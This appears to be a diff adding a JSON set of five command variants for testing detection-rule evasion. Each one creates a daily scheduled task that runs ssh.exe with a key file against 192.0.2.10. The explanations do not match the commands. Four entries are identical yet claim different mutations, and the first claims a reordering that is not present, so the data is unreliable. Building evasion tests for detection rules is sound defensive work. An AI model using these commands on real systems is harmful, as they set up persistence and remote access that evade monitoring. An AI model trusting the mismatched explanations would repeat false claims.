@@ -1,0 +1,22 @@
+[
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe\" -i \"C:\\\\Temp\\\\test.txt\" user@192.0.2.10 /sc daily",
+    "explanation": "Reordered the arguments for /tr and -i to test if the rule is sensitive to argument order. This mutation preserves the original behavior but may bypass detection if the rule does not account for reordering."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe\" -i C:\\\\Temp\\\\test.txt user@192.0.2.10 /sc daily",
+    "explanation": "Removed redundant quotes around the -i argument value to test if the rule is sensitive to quotation marks. This is a common safe mutation technique."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe\" -i C:\\\\Temp\\\\test.txt user@192.0.2.10 /sc daily",
+    "explanation": "Used short form flags and removed unnecessary whitespace to test if the rule is sensitive to formatting. This is a safe mutation technique."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe\" -i C:\\\\Temp\\\\test.txt user@192.0.2.10 /sc daily",
+    "explanation": "Used path normalization by removing redundant escape characters to test if the rule is sensitive to path formatting. This is a safe mutation technique."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe\" -i C:\\\\Temp\\\\test.txt user@192.0.2.10 /sc daily",
+    "explanation": "Removed optional elements like quotes and escape characters while preserving the core command structure. This is a safe mutation technique."
+  }
+]
